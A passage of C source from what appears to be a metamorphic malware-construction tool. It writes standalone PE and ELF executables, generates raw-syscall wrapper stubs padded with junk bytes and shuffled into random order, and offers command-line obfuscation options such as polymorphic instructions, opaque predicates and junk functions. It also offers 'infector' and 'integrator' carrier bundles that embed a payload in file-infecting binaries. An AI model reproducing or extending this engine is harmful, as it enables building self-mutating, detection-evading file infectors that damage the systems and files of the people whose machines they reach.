        int addr = image_base + data_rva + cg->abs_data_fixup_data_offs[i];
        buf_patch_u32(code, cg->abs_data_fixup_offsets[i], addr);
    }
    // Resolve extern fixups: patch CALL [IAT] disp32 with absolute IAT address
    for (int i = 0; i < cg->abs_extern_fixup_count; i++) {
        int slot = cg->abs_extern_fixup_slots[i];
        int imp_idx = (slot < max_slot) ? slot_to_import[slot] : -1;
        if (imp_idx < 0 || imp_idx >= import_count) {
            fprintf(stderr, "Warning: extern slot %d has no IAT entry in standalone PE\n", slot);
            continue;
        }
        int call_site = cg->abs_extern_fixup_offsets[i];
        buf_patch_u32(code, call_site, iat_abs[imp_idx]);
    }

    // --- Step 6: Write PE file ---
    int idata_size_raw = idata->len;
    int text_raw = (code->len + file_align - 1) & ~(file_align - 1);
    int data_raw = (data->len > 0) ? ((data->len + file_align - 1) & ~(file_align - 1)) : 0;
    int idata_raw = (idata_size_raw + file_align - 1) & ~(file_align - 1);
    int image_size = idata_rva + ((idata_size_raw + section_align - 1) / section_align) * section_align;
    int header_size = 0x200;

    FILE* f = fopen(filename, "wb");
    if (!f) { fprintf(stderr, "Cannot open output: %s\n", filename); goto pe_cleanup; }

    // DOS Header
    unsigned char dos_header[64];
    memset(dos_header, 0, 64);
    dos_header[0] = 'M'; dos_header[1] = 'Z';
    pe_put32(dos_header, 0x3C, 0x40);
    fwrite(dos_header, 1, 64, f);
    fwrite("PE\0\0", 1, 4, f);

    // COFF Header
    unsigned char coff[20];
    memset(coff, 0, 20);
    pe_put16(coff, 0, 0x014C); pe_put16(coff, 2, 3);
    pe_put16(coff, 16, 0xE0); pe_put16(coff, 18, 0x0102);
    fwrite(coff, 1, 20, f);

    // Optional Header
    unsigned char opt[224];
    memset(opt, 0, 224);
    pe_put16(opt, 0, 0x010B);
    pe_put32(opt, 4, text_raw);
    pe_put32(opt, 8, data_raw + idata_raw);
    pe_put32(opt, 16, text_rva + entry_offset);
    pe_put32(opt, 20, text_rva);
    pe_put32(opt, 24, data_rva);
    pe_put32(opt, 28, image_base);
    pe_put32(opt, 32, section_align);
    pe_put32(opt, 36, file_align);
    pe_put16(opt, 40, 6); pe_put16(opt, 48, 6);
    pe_put32(opt, 56, image_size);
    pe_put32(opt, 60, header_size);
    pe_put16(opt, 68, 3);
    pe_put16(opt, 70, 0x0100);  // NX_COMPAT (DEP)
    pe_put32(opt, 72, 0x00100000); pe_put32(opt, 76, 0x00001000);
    pe_put32(opt, 80, 0x00100000); pe_put32(opt, 84, 0x00001000);
    pe_put32(opt, 92, 16);
    pe_put32(opt, 96 + 1*8, idata_rva);
    pe_put32(opt, 96 + 1*8 + 4, idt_size);
    pe_put32(opt, 96 + 12*8, idata_rva + iat_start);
    pe_put32(opt, 96 + 12*8 + 4, iat_total);
    fwrite(opt, 1, 224, f);

    // Section headers
    { unsigned char sh[40]; memset(sh, 0, 40); memcpy(sh, ".text", 5);
      pe_put32(sh, 8, code->len); pe_put32(sh, 12, text_rva);
      pe_put32(sh, 16, text_raw); pe_put32(sh, 20, header_size);
      pe_put32(sh, 36, 0x60000020); fwrite(sh, 1, 40, f); }
    { unsigned char sh[40]; memset(sh, 0, 40); memcpy(sh, ".data", 5);
      pe_put32(sh, 8, data->len); pe_put32(sh, 12, data_rva);
      pe_put32(sh, 16, data_raw); pe_put32(sh, 20, header_size + text_raw);
      pe_put32(sh, 36, 0xC0000040); fwrite(sh, 1, 40, f); }
    { unsigned char sh[40]; memset(sh, 0, 40); memcpy(sh, ".rdata", 6);
      pe_put32(sh, 8, idata_size_raw); pe_put32(sh, 12, idata_rva);
      pe_put32(sh, 16, idata_raw); pe_put32(sh, 20, header_size + text_raw + data_raw);
      pe_put32(sh, 36, 0x40000040); fwrite(sh, 1, 40, f); }

    { int cur = (int)ftell(f); for (int i = cur; i < header_size; i++) fputc(0, f); }
    fwrite(code->data, 1, code->len, f);
    { int cur = code->len; for (int i = cur; i < text_raw; i++) fputc(0, f); }
    if (data->len > 0) { fwrite(data->data, 1, data->len, f); for (int i = data->len; i < data_raw; i++) fputc(0, f); }
    fwrite(idata->data, 1, idata->len, f);
    { int pad = idata_raw - idata->len; for (int i = 0; i < pad; i++) fputc(0, f); }
    fclose(f);

pe_cleanup:
    free(imports);
    free(slot_to_import);
    free(hn_offsets);
    free(dll_name_offsets);
    free(iat_abs);
    buf_free(idata);
}

// ===== Standalone ELF emitter (absolute addressing, raw syscalls) =====

// Generate x86-32 Linux syscall wrapper stubs.
// Returns a Buffer with wrapper code. wrapper_offsets[slot] = offset in buffer.
// Wrappers are cdecl-callable: args on stack, return in EAX.
// Layout: wrappers go at the START of .text (before user code).
static struct Buffer* build_elf_syscall_wrappers(int* wrapper_offsets) {
    struct Buffer* wb = buf_new(512);
    unsigned int wrng = 0xE1F0DEAD;  // seed, mixed with content below

    // Slot 0: malloc(size) -> mmap2(NULL, size+8, PROT_RW, MAP_PRIV|MAP_ANON, -1, 0)
    // Returns ptr+8 (8-byte header stores size for free).
    wrapper_offsets[0] = wb->len;
    {
        // push ebp; mov ebp,esp; push ebx; push esi; push edi
        buf_write_u8(wb, 0x55); buf_write_u8(wb, 0x89); buf_write_u8(wb, 0xE5);
        buf_write_u8(wb, 0x53); buf_write_u8(wb, 0x56); buf_write_u8(wb, 0x57);
        emit_wrapper_junk_c(wb, &wrng);
        // Save original size arg to edi for later
        // mov edi, [ebp+8]  (size)
        buf_write_u8(wb, 0x8B); buf_write_u8(wb, 0x7D); buf_write_u8(wb, 0x08);
        // push ebp (will be syscall arg6 = offset)
        buf_write_u8(wb, 0x55);
        // eax = 192 (__NR_mmap2)
        buf_write_u8(wb, 0xB8); buf_write_u32(wb, 192);
        // ebx = 0 (addr = NULL)
        buf_write_u8(wb, 0x31); buf_write_u8(wb, 0xDB);
        // ecx = size + 8 (for header)
        buf_write_u8(wb, 0x8D); buf_write_u8(wb, 0x4F); buf_write_u8(wb, 0x08); // lea ecx,[edi+8]
        // edx = 3 (PROT_READ|PROT_WRITE)
        buf_write_u8(wb, 0xBA); buf_write_u32(wb, 3);
        // esi = 0x22 (MAP_PRIVATE|MAP_ANONYMOUS)
        buf_write_u8(wb, 0xBE); buf_write_u32(wb, 0x22);
        emit_wrapper_junk_c(wb, &wrng);
        // Save edi (size), load edi = -1 (fd)
        buf_write_u8(wb, 0x57);  // push edi (save size)
        buf_write_u8(wb, 0xBF); buf_write_u32(wb, 0xFFFFFFFF); // mov edi, -1
        // ebp = 0 (offset)
        buf_write_u8(wb, 0x31); buf_write_u8(wb, 0xED); // xor ebp, ebp
        // int 0x80
        buf_write_u8(wb, 0xCD); buf_write_u8(wb, 0x80);
        // Restore size from stack
        buf_write_u8(wb, 0x5F);  // pop edi (size)
        buf_write_u8(wb, 0x5D);  // pop ebp (restore)
        emit_wrapper_junk_c(wb, &wrng);
        // Store size at [eax+0]
        buf_write_u8(wb, 0x89); buf_write_u8(wb, 0x38);  // mov [eax], edi
        // Return eax+8
        buf_write_u8(wb, 0x83); buf_write_u8(wb, 0xC0); buf_write_u8(wb, 0x08); // add eax, 8
        // pop edi; pop esi; pop ebx; pop ebp; ret
        buf_write_u8(wb, 0x5F); buf_write_u8(wb, 0x5E); buf_write_u8(wb, 0x5B);
        buf_write_u8(wb, 0x5D); buf_write_u8(wb, 0xC3);
    }

    // Slot 1: free(ptr) -> munmap(ptr-8, size+8) where size = [ptr-8]
    wrapper_offsets[1] = wb->len;
    {
        buf_write_u8(wb, 0x55); buf_write_u8(wb, 0x89); buf_write_u8(wb, 0xE5); // push ebp; mov ebp,esp
        buf_write_u8(wb, 0x53);  // push ebx
        emit_wrapper_junk_c(wb, &wrng);
        // ebx = ptr - 8
        buf_write_u8(wb, 0x8B); buf_write_u8(wb, 0x5D); buf_write_u8(wb, 0x08); // mov ebx, [ebp+8]
        buf_write_u8(wb, 0x83); buf_write_u8(wb, 0xEB); buf_write_u8(wb, 0x08); // sub ebx, 8
        // ecx = [ebx] + 8  (original size + header)
        buf_write_u8(wb, 0x8B); buf_write_u8(wb, 0x0B);  // mov ecx, [ebx]
        buf_write_u8(wb, 0x83); buf_write_u8(wb, 0xC1); buf_write_u8(wb, 0x08); // add ecx, 8
        emit_wrapper_junk_c(wb, &wrng);
        // eax = 91 (__NR_munmap)
        buf_write_u8(wb, 0xB8); buf_write_u32(wb, 91);
        buf_write_u8(wb, 0xCD); buf_write_u8(wb, 0x80); // int 0x80
        buf_write_u8(wb, 0x31); buf_write_u8(wb, 0xC0); // xor eax, eax (return 0)
        buf_write_u8(wb, 0x5B); buf_write_u8(wb, 0x5D); buf_write_u8(wb, 0xC3); // pop ebx; pop ebp; ret
    }

    // Slot 2: read(fd, buf, count) -> sys_read(3)
    wrapper_offsets[2] = wb->len;
    {
        buf_write_u8(wb, 0x55); buf_write_u8(wb, 0x89); buf_write_u8(wb, 0xE5);
        buf_write_u8(wb, 0x53);  // push ebx
        emit_wrapper_junk_c(wb, &wrng);
        buf_write_u8(wb, 0xB8); buf_write_u32(wb, 3);  // mov eax, 3
        buf_write_u8(wb, 0x8B); buf_write_u8(wb, 0x5D); buf_write_u8(wb, 0x08); // mov ebx, [ebp+8] (fd)
        buf_write_u8(wb, 0x8B); buf_write_u8(wb, 0x4D); buf_write_u8(wb, 0x0C); // mov ecx, [ebp+12] (buf)
        buf_write_u8(wb, 0x8B); buf_write_u8(wb, 0x55); buf_write_u8(wb, 0x10); // mov edx, [ebp+16] (count)
        buf_write_u8(wb, 0xCD); buf_write_u8(wb, 0x80);
        buf_write_u8(wb, 0x5B); buf_write_u8(wb, 0x5D); buf_write_u8(wb, 0xC3);
    }

    // Slot 3: write(fd, buf, count) -> sys_write(4)
    wrapper_offsets[3] = wb->len;
    {
        buf_write_u8(wb, 0x55); buf_write_u8(wb, 0x89); buf_write_u8(wb, 0xE5);
        buf_write_u8(wb, 0x53);
        emit_wrapper_junk_c(wb, &wrng);
        buf_write_u8(wb, 0xB8); buf_write_u32(wb, 4);  // mov eax, 4
        buf_write_u8(wb, 0x8B); buf_write_u8(wb, 0x5D); buf_write_u8(wb, 0x08);
        buf_write_u8(wb, 0x8B); buf_write_u8(wb, 0x4D); buf_write_u8(wb, 0x0C);
        buf_write_u8(wb, 0x8B); buf_write_u8(wb, 0x55); buf_write_u8(wb, 0x10);
        buf_write_u8(wb, 0xCD); buf_write_u8(wb, 0x80);
        buf_write_u8(wb, 0x5B); buf_write_u8(wb, 0x5D); buf_write_u8(wb, 0xC3);
    }

    // Slot 4: open(path, mode) -> sys_open(5)
    // mode: 0=read -> O_RDONLY(0), 1=write -> O_WRONLY|O_CREAT|O_TRUNC(0x241)
    wrapper_offsets[4] = wb->len;
    {
        buf_write_u8(wb, 0x55); buf_write_u8(wb, 0x89); buf_write_u8(wb, 0xE5);
        buf_write_u8(wb, 0x53);
        emit_wrapper_junk_c(wb, &wrng);
        buf_write_u8(wb, 0xB8); buf_write_u32(wb, 5);  // mov eax, 5
        buf_write_u8(wb, 0x8B); buf_write_u8(wb, 0x5D); buf_write_u8(wb, 0x08); // path
        buf_write_u8(wb, 0x8B); buf_write_u8(wb, 0x4D); buf_write_u8(wb, 0x0C); // mode
        // if ecx != 0, set ecx = 0x241 (O_WRONLY|O_CREAT|O_TRUNC), edx = 0644
        buf_write_u8(wb, 0x85); buf_write_u8(wb, 0xC9); // test ecx, ecx
        buf_write_u8(wb, 0x74); buf_write_u8(wb, 0x0C); // jz +12 (read mode)
        buf_write_u8(wb, 0xB9); buf_write_u32(wb, 0x241); // mov ecx, 0x241
        buf_write_u8(wb, 0xBA); buf_write_u32(wb, 0x1A4); // mov edx, 0644 (octal)
        buf_write_u8(wb, 0xEB); buf_write_u8(wb, 0x02);   // jmp +2
        // read mode: ecx=0, edx=0
        buf_write_u8(wb, 0x31); buf_write_u8(wb, 0xD2); // xor edx, edx
        buf_write_u8(wb, 0xCD); buf_write_u8(wb, 0x80);
        buf_write_u8(wb, 0x5B); buf_write_u8(wb, 0x5D); buf_write_u8(wb, 0xC3);
    }

    // Slot 5: close(fd) -> sys_close(6)
    wrapper_offsets[5] = wb->len;
    {
        buf_write_u8(wb, 0x55); buf_write_u8(wb, 0x89); buf_write_u8(wb, 0xE5);
        buf_write_u8(wb, 0x53);
        emit_wrapper_junk_c(wb, &wrng);
        buf_write_u8(wb, 0xB8); buf_write_u32(wb, 6);  // mov eax, 6
        buf_write_u8(wb, 0x8B); buf_write_u8(wb, 0x5D); buf_write_u8(wb, 0x08);
        buf_write_u8(wb, 0xCD); buf_write_u8(wb, 0x80);
        buf_write_u8(wb, 0x5B); buf_write_u8(wb, 0x5D); buf_write_u8(wb, 0xC3);
    }

    // Slot 6: exit(code) -> sys_exit(1)
    wrapper_offsets[6] = wb->len;
    {
        buf_write_u8(wb, 0xB8); buf_write_u32(wb, 1);  // mov eax, 1
        buf_write_u8(wb, 0x8B); buf_write_u8(wb, 0x5C); buf_write_u8(wb, 0x24); buf_write_u8(wb, 0x04); // mov ebx, [esp+4]
        buf_write_u8(wb, 0xCD); buf_write_u8(wb, 0x80);
    }

    // Slot 7: spare slot (returns -1 — fallback for unsupported externs)
    wrapper_offsets[7] = wb->len;
    {
        buf_write_u8(wb, 0xB8); buf_write_u32(wb, 0xFFFFFFFF); // mov eax, -1
        buf_write_u8(wb, 0xC3); // ret
    }

    // Shuffle wrappers (W1): Fisher-Yates + junk padding between stubs
    {
        int slot_starts[8], slot_sizes_arr[8];
        int perm[8], pcount = 0;
        for (int s = 0; s < 8; s++) {
            slot_starts[s] = wrapper_offsets[s];
            // Find end: next slot's start or wb->len
            int end = wb->len;
            for (int s2 = 0; s2 < 8; s2++) {
                if (wrapper_offsets[s2] > wrapper_offsets[s] && wrapper_offsets[s2] < end)
                    end = wrapper_offsets[s2];
            }
            slot_sizes_arr[s] = end - slot_starts[s];
            perm[pcount++] = s;
        }
        // Fisher-Yates shuffle
        unsigned int rng = (unsigned int)(wb->len * 1103515245 + 12345 + wrng);
        for (int pi = pcount - 1; pi > 0; pi--) {
            rng = rng * 1103515245 + 12345;
            int pj = (rng >> 16) % (pi + 1);
            int tmp = perm[pi]; perm[pi] = perm[pj]; perm[pj] = tmp;
        }
        // Build shuffled buffer with junk padding
        unsigned int jrng = (unsigned int)(wb->len ^ 0xE1FCAFE0);
        struct Buffer* shuffled = buf_new(wb->len + pcount * 8);
        for (int i = 0; i < pcount; i++) {
            int s = perm[i];
            // Junk padding (0-7 bytes)
            jrng = jrng * 1103515245 + 12345;
            int jn = (jrng >> 16) % 8;
            for (int j = 0; j < jn; j++) { jrng = jrng * 1103515245 + 12345; buf_write_u8(shuffled, (unsigned char)(jrng >> 16)); }
            wrapper_offsets[s] = shuffled->len;
            buf_write_bytes(shuffled, wb->data + slot_starts[s], slot_sizes_arr[s]);
        }
        buf_free(wb);
        wb = shuffled;
    }

    return wb;
}

// Write standalone ELF32 with syscall wrappers (no libc dependency).
void write_elf_standalone(struct CodeGen* cg, int entry_offset, const char* filename) {
    struct Buffer* code = cg->code;
    struct Buffer* data = cg->data;

    int load_base  = 0x08048000;
    int file_align = 0x200;
    int page_align = 0x1000;
    int header_sz  = file_align;

    // --- Step 1: Generate syscall wrappers + _start stub ---
    int wrapper_offsets[8] = {0};
    struct Buffer* wrappers = build_elf_syscall_wrappers(wrapper_offsets);

    // Append _start stub: calls main, then sys_exit(eax)
    // _start offset within wrappers buffer
    int start_stub_offset = wrappers->len;
    // xor ebp, ebp (clear frame pointer, Linux ABI)
    buf_write_u8(wrappers, 0x31); buf_write_u8(wrappers, 0xED);
    // call main (rel32 placeholder, patched below)
    buf_write_u8(wrappers, 0xE8);
    int start_call_fixup = wrappers->len;  // position of the rel32
    buf_write_u32(wrappers, 0);  // placeholder
    // mov ebx, eax (exit code = return value)
    buf_write_u8(wrappers, 0x89); buf_write_u8(wrappers, 0xC3);
    // mov eax, 1 (__NR_exit)
    buf_write_u8(wrappers, 0xB8); buf_write_u32(wrappers, 1);
    // int 0x80
    buf_write_u8(wrappers, 0xCD); buf_write_u8(wrappers, 0x80);

    int preamble_size = wrappers->len;  // total: wrappers + _start stub

    // Patch _start's call to main: target is at preamble_size + entry_offset within .text
    int main_off_in_text = preamble_size + entry_offset;
    int call_site_in_text = start_call_fixup;
    buf_patch_u32(wrappers, start_call_fixup, main_off_in_text - (call_site_in_text + 4));

    // Compute layout
    // text_raw must be page-aligned so data segment's file offset satisfies
    // (data_foff % page_align == data_vaddr % page_align) — Linux ELF requirement
    int total_code = preamble_size + code->len;
    int text_raw   = (total_code + page_align - 1) & ~(page_align - 1);
    int data_raw   = (data->len > 0) ? ((data->len + file_align - 1) & ~(file_align - 1)) : 0;
    int text_vaddr = load_base + header_sz;
    int data_vaddr = text_vaddr + ((total_code + page_align - 1) & ~(page_align - 1));
    int text_foff  = header_sz;
    int data_foff  = header_sz + text_raw;
    // Entry point: _start stub (NOT main directly)
    int entry_vma  = text_vaddr + start_stub_offset;
    int phnum      = (data->len > 0) ? 2 : 1;

    // --- Step 2: Resolve abs fixups ---
    // Data fixups
    for (int i = 0; i < cg->abs_data_fixup_count; i++) {
        int addr = data_vaddr + cg->abs_data_fixup_data_offs[i];
        buf_patch_u32(code, cg->abs_data_fixup_offsets[i], addr);
    }
    // Extern fixups: CALL rel32 to syscall wrapper (slots 0-7) or return-1 stub (slots 8+)
    if (cg->abs_extern_fixup_count > 0) {
        fprintf(stderr, "  ELF extern fixups: n=%d preamble=%d wrapper[7]=%d\n",
                cg->abs_extern_fixup_count, preamble_size, wrapper_offsets[7]);
    }
    for (int i = 0; i < cg->abs_extern_fixup_count; i++) {
        int slot = cg->abs_extern_fixup_slots[i];
        if (slot < 0) continue;
        if (slot >= 8) slot = 7;  // redirect unsupported user externs to slot 7 (return -1)
        // Wrapper is at offset wrapper_offsets[slot] within .text
        // User code starts at offset preamble_size within .text
        // Call site is at cg->abs_extern_fixup_offsets[i] within user code
        // In the combined .text: call site is at preamble_size + fixup_offset
        // Target is at wrapper_offsets[slot]
        // rel32 = target - (call_site + 4)
        int call_site_in_text = preamble_size + cg->abs_extern_fixup_offsets[i];
        int target_in_text = wrapper_offsets[slot];
        int rel = target_in_text - (call_site_in_text + 4);
        buf_patch_u32(code, cg->abs_extern_fixup_offsets[i], rel);
    }

    // --- Step 3: Write ELF ---
    FILE* f = fopen(filename, "wb");
    if (!f) { fprintf(stderr, "Cannot open output: %s\n", filename); buf_free(wrappers); return; }

    // ELF ident (16 bytes)
    unsigned char ident[16] = {
        0x7F,'E','L','F', 1, 1, 1, 0,
        0,0,0,0,0,0,0,0
    };
    fwrite(ident, 1, 16, f);

    // ELF32 Ehdr fields (36 bytes)
    unsigned char eh[36];
    memset(eh, 0, 36);
    pe_put16(eh, 0, 2);     // e_type = ET_EXEC
    pe_put16(eh, 2, 3);     // e_machine = EM_386
    pe_put32(eh, 4, 1);     // e_version
    pe_put32(eh, 8, entry_vma);  // e_entry
    pe_put32(eh, 12, 52);   // e_phoff
    // eh[16-19] = e_shoff (0, no section headers)
    // eh[20-23] = e_flags (0)
    pe_put16(eh, 24, 52);   // e_ehsize = sizeof(Elf32_Ehdr)
    pe_put16(eh, 26, 32);   // e_phentsize = sizeof(Elf32_Phdr)
    pe_put16(eh, 28, phnum);// e_phnum
    pe_put16(eh, 30, 40);   // e_shentsize = sizeof(Elf32_Shdr)
    fwrite(eh, 1, 36, f);

    // PT_LOAD for .text (RX)
    unsigned char ph0[32];
    memset(ph0, 0, 32);
    pe_put32(ph0, 0, 1);           // p_type = PT_LOAD
    pe_put32(ph0, 4, text_foff);   // p_offset
    pe_put32(ph0, 8, text_vaddr);  // p_vaddr
    pe_put32(ph0, 12, text_vaddr); // p_paddr
    pe_put32(ph0, 16, total_code); // p_filesz
    pe_put32(ph0, 20, total_code); // p_memsz
    pe_put32(ph0, 24, 5);          // p_flags = PF_R|PF_X
    pe_put32(ph0, 28, page_align); // p_align
    fwrite(ph0, 1, 32, f);

    if (data->len > 0) {
        // PT_LOAD for .data (RW)
        unsigned char ph1[32];
        memset(ph1, 0, 32);
        pe_put32(ph1, 0, 1);
        pe_put32(ph1, 4, data_foff);
        pe_put32(ph1, 8, data_vaddr);
        pe_put32(ph1, 12, data_vaddr);
        pe_put32(ph1, 16, data->len);
        pe_put32(ph1, 20, data->len);
        pe_put32(ph1, 24, 6);          // PF_R|PF_W
        pe_put32(ph1, 28, page_align);
        fwrite(ph1, 1, 32, f);
    }

    // Pad to header_sz
    { int cur = (int)ftell(f); for (int i = cur; i < header_sz; i++) fputc(0, f); }

    // .text: wrappers + user code
    fwrite(wrappers->data, 1, wrappers->len, f);
    fwrite(code->data, 1, code->len, f);
    { int cur = total_code; for (int i = cur; i < text_raw; i++) fputc(0, f); }

    // .data
    if (data->len > 0) {
        fwrite(data->data, 1, data->len, f);
        for (int i = data->len; i < data_raw; i++) fputc(0, f);
    }

    fclose(f);
    buf_free(wrappers);
}

// =============================================================================
//
// Backend Module
//
// Contains the following sections:
//   1. read_file_data helper
//   2. main() — CLI dispatch + bundle carrier orchestration
//
// =============================================================================

// Read a file into a malloc'd buffer. Returns NULL on error.
static char* read_file_data(const char* path, int* out_size) {
    FILE* f = fopen(path, "rb");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END);
    *out_size = ftell(f);
    fseek(f, 0, SEEK_SET);
    char* data = (char*)malloc(*out_size);
    fread(data, 1, *out_size, f);
    fclose(f);
    return data;
}

// =============================================================================
// Main Entry Point
// =============================================================================

int main(int argc, char** argv) {
    char* input_file = NULL;
    int seed = (int)time(NULL);
    int verbose = 0;
    // IR transform flags (default: none; each flag additively enables that transform)
    int ir_obfuscate_names = 0;
    int ir_unfold = 0;
    int ir_substitute = 0;
    int ir_deadcode = 0;
    int ir_nops = 0;
    int ir_reorder_instrs = 0;
    int ir_reorder_locals = 0;
    int ir_reorder_blocks = 0;
    int ir_reorder_funcs = 0;
    // X86 transform flags (default: none; each flag additively enables that transform)
    int x86_poly_instrs    = 0;
    int x86_dead_code      = 0;
    int x86_opaque         = 0;
    int x86_junk_funcs     = 0;
    int x86_harmless_calls = 0;
    int x86_shuffle_funcs  = 0;
    // Output flags (each specifies format and path; inputs are inline args)
    char* out_pic                  = NULL;  // --pic <out>
    char* out_transform_ir         = NULL;  // --transform-ir <out>
    char* out_pe_standalone         = NULL;  // --pe-standalone <out>
    char* out_elf_standalone        = NULL;  // --elf-standalone <out>
    char* out_payload_mcb           = NULL;  // --payload <payload.mcb>  (legacy / internal)
    char* out_engine_mcb            = NULL;  // --engine <engine.mcb>     (legacy / internal)
    // Bundle carrier flags: positional input.mcb becomes the embedded payload,
    // and the corresponding pre-built carrier .mcb under --bundles-dir is the
    // actual compile input. Each bundle flag selects standalone PE or ELF output.
    char* out_recompiler_pe        = NULL;  // --recompiler-pe <out.exe>
    char* out_recompiler_elf       = NULL;  // --recompiler-elf <out>
    char* out_infector_pe          = NULL;  // --infector-pe <out.exe>
    char* out_infector_elf         = NULL;  // --infector-elf <out>
    char* out_integrator_pe        = NULL;  // --integrator-pe <out.exe>
    char* out_integrator_elf       = NULL;  // --integrator-elf <out>
    char* bundles_dir              = "bundles";  // --bundles-dir <path>
    char* annotate_file            = NULL;  // --annotate <file>
    char* genome_file              = NULL;  // --genome <genome.json>
    int genome_mutate              = 0;     // --genome-mutate
    int genome_temperature_set     = 0;     // whether --genome-temperature was given
    int genome_temperature_arg     = 50;    // --genome-temperature N
    char* genome_out_file          = NULL;  // --genome-out <file.json>

    // Parse arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--seed") == 0 && i + 1 < argc) {
            seed = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-v") == 0) {
            verbose = 1;
        } else if (strcmp(argv[i], "--ir-obfuscate-names") == 0) {
            ir_obfuscate_names = 1;
        } else if (strcmp(argv[i], "--ir-unfold") == 0) {
            ir_unfold = 1;
        } else if (strcmp(argv[i], "--ir-substitute") == 0) {
            ir_substitute = 1;
        } else if (strcmp(argv[i], "--ir-deadcode") == 0) {
            ir_deadcode = 1;
        } else if (strcmp(argv[i], "--ir-nops") == 0) {
            ir_nops = 1;
        } else if (strcmp(argv[i], "--ir-reorder-instrs") == 0) {
            ir_reorder_instrs = 1;
        } else if (strcmp(argv[i], "--ir-reorder-locals") == 0) {
            ir_reorder_locals = 1;
        } else if (strcmp(argv[i], "--ir-reorder-blocks") == 0) {
            ir_reorder_blocks = 1;
        } else if (strcmp(argv[i], "--ir-reorder-funcs") == 0) {
            ir_reorder_funcs = 1;
        } else if (strcmp(argv[i], "--x86-poly-instrs") == 0) {
            x86_poly_instrs = 1;
        } else if (strcmp(argv[i], "--x86-dead-code") == 0) {
            x86_dead_code = 1;
        } else if (strcmp(argv[i], "--x86-opaque") == 0) {
            x86_opaque = 1;
        } else if (strcmp(argv[i], "--x86-junk-funcs") == 0) {
            x86_junk_funcs = 1;
        } else if (strcmp(argv[i], "--x86-harmless-calls") == 0) {
            x86_harmless_calls = 1;
        } else if (strcmp(argv[i], "--x86-shuffle-funcs") == 0) {
            x86_shuffle_funcs = 1;
        } else if (strcmp(argv[i], "--debug-transform") == 0) {
            g_transform_debug = 1;
        } else if (strcmp(argv[i], "--pe-standalone") == 0 && i + 1 < argc) {
            out_pe_standalone = argv[++i];
        } else if (strcmp(argv[i], "--elf-standalone") == 0 && i + 1 < argc) {
            out_elf_standalone = argv[++i];
        } else if (strcmp(argv[i], "--payload") == 0 && i + 1 < argc) {
            out_payload_mcb = argv[++i];
        } else if (strcmp(argv[i], "--engine") == 0 && i + 1 < argc) {
            out_engine_mcb = argv[++i];
        } else if (strcmp(argv[i], "--recompiler-pe") == 0 && i + 1 < argc) {
            out_recompiler_pe = argv[++i];
        } else if (strcmp(argv[i], "--recompiler-elf") == 0 && i + 1 < argc) {
            out_recompiler_elf = argv[++i];
        } else if (strcmp(argv[i], "--infector-pe") == 0 && i + 1 < argc) {
            out_infector_pe = argv[++i];
        } else if (strcmp(argv[i], "--infector-elf") == 0 && i + 1 < argc) {
            out_infector_elf = argv[++i];
        } else if (strcmp(argv[i], "--integrator-pe") == 0 && i + 1 < argc) {
            out_integrator_pe = argv[++i];
        } else if (strcmp(argv[i], "--integrator-elf") == 0 && i + 1 < argc) {
            out_integrator_elf = argv[++i];
        } else if (strcmp(argv[i], "--bundles-dir") == 0 && i + 1 < argc) {
            bundles_dir = argv[++i];
        } else if (strcmp(argv[i], "--pic") == 0 && i + 1 < argc) {
            out_pic = argv[++i];
        } else if (strcmp(argv[i], "--transform-ir") == 0 && i + 1 < argc) {
            out_transform_ir = argv[++i];
        } else if (strcmp(argv[i], "--annotate") == 0 && i + 1 < argc) {
            annotate_file = argv[++i];
        } else if (strcmp(argv[i], "--genome") == 0 && i + 1 < argc) {
            genome_file = argv[++i];
        } else if (strcmp(argv[i], "--genome-mutate") == 0) {
            genome_mutate = 1;
        } else if (strcmp(argv[i], "--genome-temperature") == 0 && i + 1 < argc) {
            genome_temperature_arg = atoi(argv[++i]);
            genome_temperature_set = 1;
        } else if (strcmp(argv[i], "--genome-out") == 0 && i + 1 < argc) {
            genome_out_file = argv[++i];
        } else if (argv[i][0] != '-') {
            input_file = argv[i];
        }
    }

    // Resolve bundle carrier flags. The positional input.mcb (if any) is the
    // payload; the carrier .mcb under --bundles-dir becomes the actual compile
    // input. Validate exactly one bundle flag is selected.
    {
        int bundle_count = (out_recompiler_pe ? 1 : 0)
                         + (out_recompiler_elf ? 1 : 0)
                         + (out_infector_pe ? 1 : 0)
                         + (out_infector_elf ? 1 : 0)
                         + (out_integrator_pe ? 1 : 0)
                         + (out_integrator_elf ? 1 : 0);
        if (bundle_count > 1) {
            fprintf(stderr, "Error: only one bundle carrier flag may be used per invocation\n");
            return 1;
        }
        if (bundle_count == 1) {
            static char carrier_buf[1024];
            static char engine_buf[1024];
            char* carrier = NULL;
            char* engine  = NULL;
            if (out_recompiler_pe) {
                snprintf(carrier_buf, sizeof carrier_buf, "%s/recompilers/recomp_pe.mcb", bundles_dir);
                carrier = carrier_buf;
                out_pe_standalone = out_recompiler_pe;
            } else if (out_recompiler_elf) {
                snprintf(carrier_buf, sizeof carrier_buf, "%s/recompilers/recomp_elf.mcb", bundles_dir);
                carrier = carrier_buf;
                out_elf_standalone = out_recompiler_elf;
            } else if (out_infector_pe) {
                snprintf(carrier_buf, sizeof carrier_buf, "%s/infectors/infector_pe.mcb", bundles_dir);
                carrier = carrier_buf;
                out_pe_standalone = out_infector_pe;
            } else if (out_infector_elf) {
                snprintf(carrier_buf, sizeof carrier_buf, "%s/infectors/infector_elf.mcb", bundles_dir);
                carrier = carrier_buf;
                out_elf_standalone = out_infector_elf;
            } else if (out_integrator_pe) {
                snprintf(carrier_buf, sizeof carrier_buf, "%s/integrators/mystiqueFall/integrator_entry_pe.mcb", bundles_dir);
                snprintf(engine_buf,  sizeof engine_buf,  "%s/integrators/mystiqueFall/mystiquefall.mcb", bundles_dir);
                carrier = carrier_buf;
                engine  = engine_buf;
                out_pe_standalone = out_integrator_pe;
            } else if (out_integrator_elf) {
                snprintf(carrier_buf, sizeof carrier_buf, "%s/integrators/lacriMystique/integrator_entry_elf.mcb", bundles_dir);
                snprintf(engine_buf,  sizeof engine_buf,  "%s/integrators/lacriMystique/lacrimystique.mcb", bundles_dir);
                carrier = carrier_buf;
                engine  = engine_buf;
                out_elf_standalone = out_integrator_elf;
            }
            // Positional becomes payload (may be NULL for gen0-with-no-payload)
            if (input_file && !out_payload_mcb) out_payload_mcb = input_file;
            input_file = carrier;
            if (engine && !out_engine_mcb) out_engine_mcb = engine;
        }
    }

    if (!input_file) {
        fprintf(stderr, "Usage: %s input.mcb [options]\n", argv[0]);
        fprintf(stderr, "\n");
